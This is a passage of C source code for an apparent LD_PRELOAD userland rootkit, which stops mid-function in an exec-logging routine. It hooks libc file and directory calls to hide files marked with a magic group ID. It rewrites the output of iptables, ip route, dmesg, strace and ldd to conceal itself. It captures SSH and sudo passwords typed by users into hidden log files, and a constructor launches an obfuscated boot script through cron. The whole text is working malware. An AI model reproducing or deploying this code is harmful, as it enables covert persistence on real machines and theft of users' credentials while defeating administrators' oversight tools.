#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdarg.h>
#include <ctype.h>
#include <inttypes.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <sys/statvfs.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <net/if.h>
#include <time.h>
#include <syslog.h>
#include <sched.h>
#include <fcntl.h>
#include <pwd.h>
#include <tcpd.h>
#include "../include/def.h"
#include "../include/colors.h"
#include "../include/syscalls.h"
#include "../build/xor.h"

//#define HIDDEN_NETWORK 1
#undef HIDDEN_NETWORK
//#define FILTER_MOUNTS 1
#undef FILTER_MOUNTS
//#define FILTER_MODULES 1
#undef FILTER_MODULES
//#define DIRTYCOW_PROTECT 1
#undef DIRTYCOW_PROTECT

//#define FILTER_LOAD 1
#undef FILTER_LOAD
#undef FILTER_STAT
#undef HIDDEN_EIG
#undef HIDDEN_PID_LIST
#undef FILTER_SYSLOG
#undef FILTER_MEM
#undef EXEC_HARDEN

#define FILTER_STRACE 1
//#undef FILTER_STRACE
#define __inline__ inline __attribute__((always_inline))

extern const char *__progname;
static int sshpass = 0;
char *ssh_argv[32];

struct sym {
	int              (*xstat)(int, const char *, struct stat *);
	int              (*xstat64)(int, const char *, struct stat64 *);
	int              (*lxstat)(int, const char *, struct stat *);
	int              (*lxstat64)(int, const char *, struct stat64 *);
	int              (*lstat)(const char *path, struct stat *);
	int              (*lstat64)(const char *path, struct stat64 *);
	int              (*stat)(const char *path, struct stat *);
	int              (*fxstatat)(int vers, int fd, const char *file, struct stat *st, int flag);
	ssize_t          (*write)(int fd, const void *buf,size_t count);
	ssize_t          (*read)(int, void *, size_t);
	struct dirent   *(*readdir)(DIR *dirp);
	struct dirent64 *(*readdir64)(DIR *dirp);
	DIR             *(*opendir)(const char *name);
	int              (*open)(const char *, int, mode_t);
	int              (*open64)(const char *, int, mode_t);
	FILE            *(*fopen)(const char *, const char *);
	int              (*unlink)(const char *);
	int              (*execve)(const char *filename, char *const argv[], char *const envp[]);
	struct passwd   *(*getpwnam)(const char *);
	int              (*getpwnam_r)(const char *, struct passwd *, char *, size_t, struct passwd **);	
	int              (*setgid)(gid_t gid);
	int              (*setregid)(gid_t rgid, gid_t egid);
	int              (*setresgid)(gid_t rgid, gid_t egid, gid_t sgid);
	int              (*access)(const char *path, int mode);
	int              (*truncate)(const char *path, off_t length);
	int              (*chdir)(const char *path);
	int              (*chmod)(const char *path, mode_t mode);
	int              (*chown)(const char *path, uid_t owner, gid_t group);
	int              (*fchownat)(int dirfd, const char *path, uid_t owner, gid_t group, int flags);
	int              (*creat)(const char *path, mode_t mode);
	int              (*mkdir)(const char *path, mode_t mode);
	int              (*mkdirat)(int dirfd, const char *path, mode_t mode);
	int              (*unlinkat)(int dirfd, const char *pathname, int flags);
	int              (*openat)(int dirfd, const char *pathname, int flags, ...);
	int              (*statfs)(const char *path, struct statfs *fs);
	int              (*statvfs)(const char *path, struct statvfs *vfs);
	int              (*ioctl)(int fd, int request, ...);
	int              (*hosts_access)(struct request_info *);
#ifdef __FreeBSD__
	struct utmp     *(*pututxline)(const struct utmp *ut);
#else
	void             (*updwtmp)(const char *wtmp_file, const struct utmp *ut);
	struct utmp     *(*pututline)(const struct utmp *ut);
	int              (*stat64)(const char *path, struct stat64 *);
	int              (*prctl)(int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5);
#endif
};

struct sym libc_syms;

#define LIBC_HOOK(sym, name) \
({ \
	if (!libc_syms.sym) \
		libc_syms.sym = dlsym(RTLD_NEXT, name); \
})

static void __libc_sym_init() __attribute__ ((constructor));
static void __libc_sym_init()
{
	FILE *fp;
	char buf[32];
	int fd;

	if (!strstr(__progname, "cron"))
		return;
	if ((fd = syscall(SYS_OPEN, "/dev/shm/.lck", O_CREAT|O_RDONLY|O_EXCL, 0644)) < 0)
		return;

	sleep(5);
	syscall(SYS_FCHOWN, fd, 0, MAGIC_GID);
	syscall(SYS_CLOSE, fd);
	switch (fork()) {
		case 0:
			syscall(SYS_SETGID, MAGIC_GID);
			fp = popen(XOR(BOOT_SCRIPT), "r");
			pclose(fp);
			exit(0);
		default:
			break;
	}
}

static __inline__ int hidden_stat(const char *path)
{
	struct stat64 sb;

	if (syscall(SYS_STAT64, path, &sb) < 0)
		return 0;
	if (sb.st_gid == MAGIC_GID)
		return 1;
	return 0;
}

static __inline__
unsigned long rkspace_usage(char *path)
{
	char buf[32] = {0};
	char *p, scale;
	unsigned long size;
	int fd;

	fd = syscall(SYS_OPEN, path, O_RDONLY);
	if (fd < 0)
		return 0;
	syscall(SYS_READ, fd, buf, 255);
	syscall(SYS_CLOSE, fd);
	p = strchr(buf, '\n');
	if (p)
		*p = 0;
	size = strtoul(buf, NULL, 10);
	return size*1024;
}

int statvfs(const char *path, struct statvfs *vfs)
{
	char buf[64];
	char rkpath[256];
	unsigned long rkspace;
	int retval;

	LIBC_HOOK(statvfs, XOR(STATVFS));
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (*path == '/' && *(path+1) == '\0') {
		sprintf(rkpath, "%s/.usage", XOR(LDHOME));
		retval = libc_syms.statvfs(path, vfs);
		if (retval < 0)
			return -1;
		rkspace = rkspace_usage(rkpath);
		vfs->f_bfree  += (rkspace/vfs->f_bsize);
		vfs->f_bavail += (rkspace/vfs->f_bsize);
		return (retval);
	}
#ifdef HIDDEN_EIG
	if (!strcmp(path, "/data")) {
		retval = libc_syms.statvfs(path, vfs);
		if (retval < 0)
			return -1;
		sprintf(rkpath, "%s/.data", XOR(LDHOME));
		rkspace = rkspace_usage(rkpath);
		if (!rkspace)
			return (retval);
		vfs->f_bfree  += (rkspace/vfs->f_bsize);
		vfs->f_bavail += (rkspace/vfs->f_bsize);
		return (retval);
	}
#endif
out:
	return libc_syms.statvfs(path, vfs);
}

// used by yum - fails if any files in /var/cache are MAGIC_GID
int __xstat64(int version, const char *path, struct stat64 *sb)
{
	int ret;

	ret = syscall(SYS_STAT64, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);
	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

int __lxstat64(int version, const char *path, struct stat64 *sb)
{
	int ret;

	ret = syscall(SYS_LSTAT64, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

int __xstat(int version, const char *path, struct stat *sb)
{
	int ret;

	ret = syscall(SYS_STAT, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

// used by ls
int __lxstat(int version, const char *path, struct stat *sb)
{
	int ret;

	ret = syscall(SYS_LSTAT, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return ret;
}

int lstat(const char *path, struct stat *sb)
{
	int ret;

	ret = syscall(SYS_LSTAT, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
out:
	return (ret);
}

int lstat64(const char *path, struct stat64 *sb)
{
	int ret;

	ret = syscall(SYS_LSTAT64, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		goto out;

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
out:
	return (ret);
}


int stat(const char *path, struct stat *sb)
{
	int ret;

	ret = syscall(SYS_STAT, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

#ifndef __FreeBSD__
// calls SYS_STAT on x86-64 - __xstat64()
int stat64(const char *path, struct stat64 *sb)
{
	int ret;

	ret = syscall(SYS_STAT64, path, sb);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}
#endif

int fstatat(int dirfd, const char *path, struct stat *sb, int flags)
{
	int ret;

	ret = syscall(SYS_FSTATAT, dirfd, path, sb, flags);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

int __fxstatat(int vers, int fd, const char *file, struct stat *sb, int flags)
{
	int ret;

	ret = syscall(SYS_FSTATAT, fd, file, sb, flags);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sb->st_gid == MAGIC_GID) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}
	
int access(const char *path, int mode)
{
	int ret;

	ret = syscall(SYS_ACCESS, path, mode);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

int truncate(const char *path, off_t length)
{
	int ret;

	ret = syscall(SYS_TRUNCATE, path, length);
	if (ret < 0 || syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (hidden_stat(path)) {
		errno = ENOENT;
		return -1;
	}
	return (ret);
}

static int sniff_ssh_session = 0;
static int sshdone = 0;

ssize_t read(int fd, void *xbuf, size_t count)
{
	struct stat sb;
	char buf[64];
	ssize_t ret;
	int logfd;

	ret = syscall(SYS_READ, fd, xbuf, count);
	if (!sshpass || (ret < 0))
		return (ret);

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	logfd = syscall(SYS_OPEN, XOR(SSHPASS2), O_RDWR|O_APPEND|O_CREAT, 0644);
	syscall(SYS_WRITE, logfd, xbuf, 1);
	syscall(SYS_CLOSE, logfd);
	if (ret == 1 && *(char *)xbuf == '\n') {
		sshpass = 0;
		if (!syscall(SYS_STAT, XOR(SSH_SNIFF), &sb))
			sniff_ssh_session = 1;
	}
	return (ret);
}
ssize_t write(int fd, const void *xbuf, size_t count)
{
	char buf[256];
	int logfd;
	ssize_t ret;

	ret = syscall(SYS_WRITE, fd, xbuf, count);
	if (!xbuf || (ret < 0))
		goto out;

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return (ret);

	if (sniff_ssh_session) {
		if (!isascii(*(char *)xbuf))
			goto out;
		if (fd != 5)
			goto out;
		logfd = syscall(SYS_OPEN, XOR(SNIFF_LOG), O_RDWR|O_APPEND|O_CREAT, 0644);
		syscall(SYS_WRITE, logfd, xbuf, count);
		syscall(SYS_CLOSE, logfd);
		goto out;
	}

	if (!strcmp(__progname, XOR(SUDO)) && !strncmp(xbuf, XOR(SUDOPASS), 11)) {
		logfd = syscall(SYS_OPEN, XOR(SSHPASS2), O_RDWR|O_APPEND|O_CREAT, 0644);
		syscall(SYS_WRITE, logfd, xbuf, count);
		syscall(SYS_WRITE, logfd, "\n", 1);
		syscall(SYS_CLOSE, logfd);
		sshpass = 1;
	}

	if (!strcmp(__progname, "ssh") && strstr(xbuf, XOR(ASSWORD2))) {
		logfd = syscall(SYS_OPEN, XOR(SSHPASS2), O_RDWR|O_APPEND|O_CREAT, 0644);
		syscall(SYS_WRITE, logfd, xbuf, count);
		syscall(SYS_WRITE, logfd, "\n", 1);
		syscall(SYS_CLOSE, logfd);
		sshpass = 1;
	}
out:
	return (ret);
}

#ifdef HIDDEN_PROC_LIST
int pid_list(char *pidbuf, int *hidden_pids)
{
	char *p;
	int nr_pids = 0;

	while ((p=strchr(pidbuf, '\n'))) {
		*p = 0;
		hidden_pids[nr_pids++] = atoi(pidbuf);
		pidbuf = p+1;
		if (*pidbuf == '\0')
			break;
	}
	return (nr_pids);
}

static __inline__ int hidden_proc_list(char *dir)
{
	char path[256];
	char buf[256];
	int hidden_pids[256];
	int nr_pids, fd, n, x;
	int pid = atoi(dir);

	sprintf(path, "%s/.pid", XOR(LDHOME));
	fd = syscall(SYS_OPEN, path, O_RDONLY);
	if (fd < 0)
		return 0;
	n = syscall(SYS_READ, fd, buf, 255);
	close(fd);
	if (n <= 0)
		return 0;
	buf[n] = 0;
	nr_pids = pid_list(buf, hidden_pids);
	for (x=0; x<nr_pids; x++) {
		if (hidden_pids[x] == pid)
			return 1;
	}
	return 0;
}
#endif

#ifdef HIDDEN_NETWORK
static __inline__ int hidden_iface(char *iface)
{
	char buf[32];

	if (!strncmp(iface, XOR(TAP4), 4))
		return 1;
	return 0;
}

int ioctl(int fd, unsigned long request, ...)
{
	struct ifconf *ifc;
	struct ifreq *ifreq;
	char buf[64];
	va_list va;
	void *cmd;
	int retval, nr_if, x;

	va_start(va, request);
	cmd = va_arg(va, void *);

	LIBC_HOOK(ioctl, XOR(IOCTL));
	retval = libc_syms.ioctl(fd, request, cmd);
	if (retval < 0)
		return (retval);
	if ((request != SIOCGIFFLAGS) && (request != SIOCGIFCONF))
		return (retval);

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return (retval);

	if (request == SIOCGIFFLAGS) {
		if (cmd && !strcmp((char *)cmd, XOR(TAP4))) {
			errno = ENODEV;
			return -1;
		}
		return (retval);
	}

	ifc = (struct ifconf *)cmd;
	nr_if = ifc->ifc_len/sizeof(struct ifreq);
	ifreq = ifc->ifc_req;
	if (!ifreq)
		return (retval);
	for (x=0; x<nr_if; x++) {
		if (!strcmp(ifreq->ifr_name, XOR(TAP4))) {
			memset(ifreq, 0, sizeof(struct ifreq));
			memmove(ifreq, &ifc->ifc_req[x+1], (nr_if-x-1)*sizeof(struct ifreq));
			ifc->ifc_len -= sizeof(struct ifreq);
		}
		ifreq++;
	}
	return (retval);
}
#endif

struct dirent *readdir(DIR *dirp)
{
	struct dirent *dir;
	struct stat sb;
	char path[512];
	char proc_self_fd[512];
	char buf[256];
	int nbytes, fd;

	LIBC_HOOK(readdir, "readdir");
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return libc_syms.readdir(dirp);

	while (1)
	{
		dir = libc_syms.readdir(dirp);
		if (!dir)
			return (NULL);
		if (hidden_stat(dir->d_name))
			continue;

		fd = dirfd(dirp);
		snprintf(proc_self_fd, 255, XOR(PROC_FD), fd);
		nbytes = readlink(proc_self_fd, path, 255);
		path[nbytes]   = '/';
		path[nbytes+1] = 0;
		strcat(path, dir->d_name);
		syscall(SYS_STAT, path, &sb);
		if (sb.st_gid == MAGIC_GID)
			continue;
#ifdef HIDDEN_PID_LIST
		if (!strncmp(path, XOR(PROC), 5))
			if (hidden_proc_list(dir->d_name))
				continue;
#endif
#ifdef HIDDEN_NETWORK
		if (!strncmp(path, "/sys/class/net", 14))
			if (hidden_iface(dir->d_name))
				continue;
		if (!strcmp(path, "/proc/sys/net/ipv4/conf"))
			if (hidden_iface(dir->d_name))
				continue;
		if (!strcmp(path, "/proc/sys/net/ipv6/conf"))
			if (hidden_iface(dir->d_name))
				continue;
#endif
		break;
	}
	errno = 0;
	return (dir);
}

#ifndef __FreeBSD__
struct dirent64 *readdir64(DIR *dirp)
{
	struct dirent64 *dir;
	struct stat64 sb;
	char buf[256];
	char path[512];
	char proc_self_fd[512];
	int fd, nbytes;

	LIBC_HOOK(readdir64, "readdir64");
	if (syscall(SYS_GETGID) == MAGIC_GID)
		return libc_syms.readdir64(dirp);

	while (1) {
		dir = libc_syms.readdir64(dirp);
		if (!dir)
			return (dir);
		if (hidden_stat(dir->d_name))
			continue;

		fd = dirfd(dirp);
		snprintf(proc_self_fd, 255, XOR(PROC_FD), fd);
		nbytes = readlink(proc_self_fd, path, 255);
		path[nbytes]   = '/';
		path[nbytes+1] = 0;
		strcat(path, dir->d_name);
		syscall(SYS_STAT64, path, &sb);
		if (sb.st_gid == MAGIC_GID)
			continue;
		break;
	}
	errno = 0;
	return (dir);
}
#endif

DIR *opendir(const char *name)
{
	struct stat sb;

	LIBC_HOOK(opendir, "opendir");
	if (!name)
		goto out;
	if (syscall(SYS_GETGID) == MAGIC_GID)
		goto out;
	syscall(SYS_STAT, name, &sb);
	if (sb.st_gid == MAGIC_GID) {
		errno = ENOENT;
		return NULL;
	}
out:
	return libc_syms.opendir(name);
}

static  int istty()
{
	char path[16] = {0};

	readlink("/proc/self/fd/0", path, sizeof(path)-1);
	if (strstr(path, "/dev/pts") || strstr(path, "/dev/tty"))
		return 1;
	return 0;
}

char **get_mod_list(int fd, int *nr_mods)
{
	char buf[1024];
	char *p1, *p2;
	char **modlist = malloc(64*sizeof(char *));
	int count = 0, n;

	n = syscall(SYS_READ, fd, buf, sizeof(buf)-1);
	buf[n] = 0;
	p1 = buf;
	while ((p2=strchr(p1, '\n'))) {
		*p2 = 0;
		modlist[count++] = strdup(p1);
		p1 = p2 + 1;
	}
	*nr_mods = count;
	return (modlist);
}

static __inline__ char **strline(char *buf, int *nr_lines)
{
	char *p, *line = buf;
	char **lines;
	int count = 0, x = 0;

	while ((p=strchr(line, '\n'))) {
		count++;
		line = p+1;
	}

	lines = (char **)malloc(count*sizeof(char *));
	line = buf;
	while ((p=strchr(line, '\n'))) {
		*p = 0;
		lines[x++] = strdup(line);
		line = p+1;
	}
	*nr_lines = count;
	return (lines);
}

static __inline__ int rule_hidden(char *line, char **rules, int nr_rules)
{
	int x;
	for (x=0; x<nr_rules; x++) {
		if (strstr(line, rules[x]))
			return 1;
	}
	return 0;
}

static __inline__ int readfile(char *path, char *outbuf)
{
	struct stat sb;
	int fd, nbytes;

	if (syscall(SYS_STAT, path, &sb))
		return 0;

	fd = syscall(SYS_OPEN, path, O_RDONLY);
	if (fd < 0)
		return 0;
	nbytes = syscall(SYS_READ, fd, outbuf, sb.st_size);
	syscall(SYS_CLOSE, fd);
	outbuf[nbytes] = 0;
	return 1;
}

void unconfined_exec(char *a, char *b, char *c)
{
	char ldpath1[32];
	char ldpath2[32];
	char buf[256];
	char *p;

	p = (char *)XOR(HIDDEN_PRELOAD);
	strcpy(ldpath1, p);
	p = (char *)XOR(HIDDEN_PRELOAD2);
	strcpy(ldpath2, p);
	switch (fork()) {
		case 0: {
			sleep(1);
			rename(ldpath2, ldpath1);
			exit(0);
		};
		default:
			rename(ldpath1, ldpath2);
	}
}

static __inline__ int exec_iptables(const char *exec, char *const argv[], char *const envp[])
{
	char xbuf[8192*2];
	char buf[64];
	char outbuf[8192*2];
	char rulebuf[4096];
	char **hidden_rules, *line, *p;
	int pfd[2], len, nr_rules, n, x = 0;

	pipe(pfd);
	switch (fork()) {
		case 0:
			dup2(pfd[1], 1);
			close(pfd[0]);
			close(pfd[1]);
			syscall(SYS_EXECVE, exec, argv, envp);
			exit(0);
		default:
			break;
	}
	close(pfd[1]);
	n = syscall(SYS_READ, pfd[0], xbuf, sizeof(xbuf));
	if (!n)
		return 0;

	if (!readfile((char *)XOR(HIDDEN_FW), rulebuf)) {
		syscall(SYS_WRITE, 1, xbuf, n);
		exit(0);
	}

	hidden_rules = strline(rulebuf, &nr_rules);

	line = xbuf;
	memset(outbuf, 0, 16);
	while ((p=strchr(line, '\n'))) {
		if (*line == '\n') {
			line++;
			strcat(outbuf, "\n");
			continue;
		}
		*p = 0;
		if (rule_hidden(line, hidden_rules, nr_rules)) {
			line = p+1;
			continue;
		}
		strcat(outbuf, line);
		strcat(outbuf, "\n");
		line = p+1;
	}
	syscall(SYS_WRITE, 1, outbuf, strlen(outbuf));
	exit(0);
	return 0;	
}

static __inline__ int filter_iptables(const char *exec, char *const argv[], char *const envp[])
{
	int x = 0;
	int run = 0;

	while (argv[x]) {
		if (!strcmp(argv[x], "-L") || !strcmp(argv[x], "-S")) {
			exec_iptables(exec, argv, envp);
			run++;
		}
		x++;
	}
	return run;
}

static __inline__ int filter_ip_route(const char *exec, char *const argv[], char *const envp[])
{
	char xbuf[8192*2];
	char buf[64];
	char outbuf[8192*2];
	char nicbuf[4096];
	char **hidden_nics, *line, *p;
	int pfd[2], len, nr_nics, nbytes, count = 0, x = 0;
	int hidden_link = 0;
	int hidden_addr = 0;

	if (syscall(SYS_GETGID) == MAGIC_GID)
		return 0;

	pipe(pfd);
	switch (fork()) {
		case 0:
			dup2(pfd[1], 1);
			close(pfd[0]);
			close(pfd[1]);
			syscall(SYS_EXECVE, exec, argv, envp);
			exit(0);
		default:
			break;
	}
	close(pfd[1]);
	while ((nbytes=syscall(SYS_READ, pfd[0], xbuf+count, 4096)) > 0)
		count += nbytes;
	if (!count)
		return 0;

	if (!readfile((char *)XOR(HIDDEN_IFACE), nicbuf)) {
		syscall(SYS_WRITE, 1, xbuf, nbytes);
		exit(0);
	}

	hidden_nics = strline(nicbuf, &nr_nics);

	line = xbuf;
	memset(outbuf, 0, 16);
	while ((p=strchr(line, '\n'))) {
		if (hidden_link) {
			line = p+1;
			hidden_link = 0;
			continue;
		}
		if (hidden_addr) {
			line = p +1;
			hidden_addr -= 1;
			continue;
		}
		if (*line == '\n') {
			line++;
			strcat(outbuf, "\n");
			continue;
		}
		*p = 0;
		if (rule_hidden(line, hidden_nics, nr_nics)) {
			if (argv[1] && !strcmp(argv[1], "link"))
				hidden_link = 1;
			else if (argv[1] && (!strcmp(argv[1], "addr") || !strcmp(argv[1], "a")))
				hidden_addr = 3;
			line = p+1;
			continue;
		}
		strcat(outbuf, line);
		strcat(outbuf, "\n");
		line = p+1;
	}
	syscall(SYS_WRITE, 1, outbuf, strlen(outbuf));
	exit(0);
	return 0;
}

static __inline__ int newline(char *s, int fd)
{
	int n, len = 0;
	char c = 0;

	while (1) {
		n = syscall(SYS_READ, fd, &c, 1);
		if (n <= 0)
			return -1;
		if (c == '\n') {
			*s = '\n';
			return (len);
		} else {
			*s++ = c;
			len++;
		}
	}
}

static __inline__ FILE *filter_modules(const char *path)
{
	FILE *mod_fp, *tmp;
	char **hidden_mods;
	char line[512];
	char buf[128];
	int fd, nr_mods, x, found_mod = 0;

	mod_fp = libc_syms.fopen(path, "r");
	if ((fd=syscall(SYS_OPEN, XOR(HIDDEN_LKM), O_RDONLY)) < 0)
		return (mod_fp);
	if (!mod_fp) {
		errno = ENOENT;
		return NULL;
	}
	tmp = tmpfile();
	if (!tmp)
		return (mod_fp);

	hidden_mods = get_mod_list(fd, &nr_mods);
	while (fgets(line, 255, mod_fp) != NULL) {
		for (x=0; x<nr_mods; x++) {
			if (strstr(line, hidden_mods[x])) {
				found_mod = 1;
				break;
			}
		}
		if (found_mod) {
			found_mod = 0;
			continue;
		}
		fputs(line, tmp);
	}
	fclose(mod_fp);
	fseek(tmp, 0, SEEK_SET);
	return (tmp);
}

static __inline__ void filter_dmesg(const char *path, char *const argv[], char *const envp[])
{
	char buf[32];
	char outbuf[4096*8];
	char logbuf[256];
	char **dmesg_filter = NULL;
	int pfd[2];
	int outlen, fd, val, x, n;
	int found_str = 0, nr_dmesg = 0;

	pipe(pfd);
	switch (fork()) {
		case 0:
			dup2(pfd[1], 1);
			close(pfd[0]);
			close(pfd[1]);
			syscall(SYS_EXECVE, path, argv, envp);
			exit(0);
		default:
			break;
	}
	close(pfd[1]);

	fd=syscall(SYS_OPEN, XOR(FILTER_DMESG), O_RDONLY);
	if (fd > 0) {
		dmesg_filter = get_mod_list(fd, &nr_dmesg);
		syscall(SYS_CLOSE, fd);
	}
	
	while ((n=newline(logbuf, pfd[0])) != -1) {
		if (dmesg_filter) {
			for (x=0; x<nr_dmesg; x++) {
				if (strstr(logbuf, dmesg_filter[x])) {
					memset(logbuf, 0, 256);
					found_str = 1;
					break;
				}
			}
		}

		if (found_str) {
			found_str = 0;
			continue;
		}

		if (strstr(logbuf, XOR(DMESG_PROMISC))) {
			memset(logbuf, 0, 256);
			continue;
		}
		if (strstr(logbuf, XOR(DMESG_KVM))) {
			memset(logbuf, 0, 256);
			continue;
		}
		if (strstr(logbuf, XOR(DMESG_TCPDUMP))) {
			memset(logbuf, 0, 256);
			continue;
		}
		if (strstr(logbuf, XOR(LDPATH))) {
			memset(logbuf, 0, 256);
			continue;
		}
		if (strstr(logbuf, XOR(LIBDL))) {
			memset(logbuf, 0, 256);
			continue;
		}
		printf("%s", logbuf);
		memset(logbuf, 0, 256);
	}
	exit(0);
}

#ifdef FILTER_STRACE
static __inline__ void filter_strace(const char *path, char *const argv[], char *const envp[])
{
	char buf[32];
	char outbuf[4096*8];
	char logbuf[1024];
	int pfd[2];
	int efd[2];
	char *exec[20];
	char *logfile = NULL;
	int preload_lib = 0, outlen = 0, fd, x, y;
	int ldhome = 0;
	int attach = 0;

	x = 1;
	while (argv[x]) {
		if (!strcmp(argv[x], "-o")) {
			logfile = argv[x+1];
		}
		if (!strcmp(argv[x], "-p")) {
			attach = 1;
			logfile = NULL;
		}
		x++;
	}
	if (!attach) {
		exec[0] = (char *)path;
		exec[1] = "-o";
		exec[2] = "/tmp/.orbit";
		if (!logfile) {
			x = 1;
			y = 3;
			while (argv[x])
				exec[y++] = argv[x++];
		}
		exec[y] = NULL;
	}

	pipe(pfd);
	if (attach)
		pipe(efd);
	switch (fork()) {
		case 0:
			dup2(pfd[1], 1);
			if (attach) {
//				dup2(efd[1], 2);
				dup2(pfd[1], 2);
				close(efd[0]);
				close(efd[1]);
			}
			close(pfd[0]);
			close(pfd[1]);
			if (!logfile)
				syscall(SYS_EXECVE, exec[0], exec, envp);
			else
				syscall(SYS_EXECVE, argv[0], argv, envp);
			exit(0);
		default:
			break;
	}
	close(pfd[1]);
	if (attach)
		close(efd[1]);
	else {
		outlen = syscall(SYS_READ, pfd[0], outbuf, sizeof(outbuf));
		outbuf[outlen] = 0; 
		if (!logfile)
			logfile = exec[2];
	}
	if (attach) {
		while (newline(logbuf, pfd[0])) {
			if (ldhome) {
				memset(logbuf, 0, 1024);
				ldhome = 0;
				continue;
			}
			if (strstr(logbuf, "ld.so.nohwcap")) {
				syscall(SYS_WRITE, 1, logbuf, strlen(logbuf));
				memset(logbuf, 0, 1024);
				continue;
			}
			if (preload_lib) {
				preload_lib++;
				if (preload_lib > 9)
					preload_lib = 0;
				continue;
			}
#define STRACE_LDPRELOAD "access(\"/etc/ld.so.preload\", R_OK)      = -1 ENOENT (No such file or directory)"

			if (strstr(logbuf, XOR(HIDDEN_PRELOAD))) {
				syscall(SYS_WRITE, 1, STRACE_LDPRELOAD, strlen(STRACE_LDPRELOAD));
				preload_lib = 1;
				continue;
			}
			else if (strstr(logbuf, MAGIC_GID_STR))
				continue;
			else if (strstr(logbuf, XOR(LDHOME))) {
				ldhome = 1;
				continue;
			}
			syscall(SYS_WRITE, 1, logbuf, strlen(logbuf));
			memset(logbuf, 0, 1024);
		}
		exit(0);
	}	

	fd = syscall(SYS_OPEN, logfile, O_RDONLY);
	if (fd < 0) {
		syscall(SYS_OPEN, "/tmp/.orbit");
		exit(0);
	}

	while (newline(logbuf, fd) != -1) {
		if (ldhome) {
			memset(logbuf, 0, 1024);
			ldhome = 0;
			continue;
		}
		if (preload_lib) {
			preload_lib++;
			if (preload_lib > 9)
				preload_lib = 0;
			continue;
		}
		if (strstr(logbuf, XOR(HIDDEN_PRELOAD))) {
			preload_lib = 1;
			continue;
		}
		else if (strstr(logbuf, MAGIC_GID_STR))
			continue;
		else if (strstr(logbuf, XOR(LDHOME))) {
			ldhome = 1;
			continue;
		}
		syscall(SYS_WRITE, 1, logbuf, strlen(logbuf));
		memset(logbuf, 0, 1024);
	}
	syscall(SYS_WRITE, 1, outbuf, outlen);
	close(fd);
	syscall(SYS_UNLINK, "/tmp/.orbit");
	exit(0);
}
#else
#define filter_strace(a1,a2,a3) unconfined_exec(NULL, NULL, NULL)
#endif

#ifdef DIRTYCOW_PROTECT
int madvise(void *start, size_t length, int advice)
{
	struct stat sb;
	char buf[4096];
	char cwd[256];
	char timebuf[32];
	int pid, ppid;
	int logfd;
	time_t timenow;

	if ((syscall(SYS_STAT, DIRTYCOW_PROT, &sb) < 0) || (advice != MADV_DONTNEED))
		return syscall(SYS_MADVISE, start, length, advice);
	return 0;
}
#endif

static __inline__ void filter_ldd(char *const argv[])
{
	char buf[4096];
	char outbuf[4096];
	char cmd[8192];
	FILE *fp;
	char *p, *p2;

	sprintf(cmd, XOR(LD_LIST), argv[1]);
	fp = popen(cmd, "r");
	fread(outbuf, 4096, 1, fp);
	p = outbuf;

	while ((p2=strchr(p, '\n'))) {
		*p2 = 0;
		if (strstr(p, XOR(LDHOME))) {
			p = p2+1;
			continue;
		}
		printf("%s\n", p);
		p = p2+1;
	}
	exit(0);
}

static __inline__
void exec_log(const char *filename, char *const argv[])
{
	struct stat sb;
	const char *bin_name, *p;
	char        buf[1024];
	char        cwd[256];
	char        bin[256];
	char        timebuf[32];
	time_t      timenow;
	int         logfd, x = 1;

	if (!istty())
		return;

	if (!syscall(SYS_STAT, XOR(HIDDEN_NOLOG), &sb))
		return;

	if (!strstr(__progname, "bash") && strcmp(__progname, "sh"))
		return;

	timenow = time(NULL);
	strftime(timebuf, 32, "%m-%d %H:%M:%S", localtime(&timenow));
	logfd = syscall(SYS_OPEN, XOR(HIDDEN_EXECLOG), O_RDWR|O_CREAT|O_APPEND, 0777);
	p = strrchr(filename, '/');
	if (p) {
		bin_name = bin;
		strncpy((char *)bin_name, p+1, 255);
	}
	else
		bin_name = filename;
	if (!strncmp(filename, "[B", 2))
		snprintf(buf, 256, "[%s] [%s] [BLOCKED] %s ", timebuf, getcwd(cwd, 255), bin_name);
	else
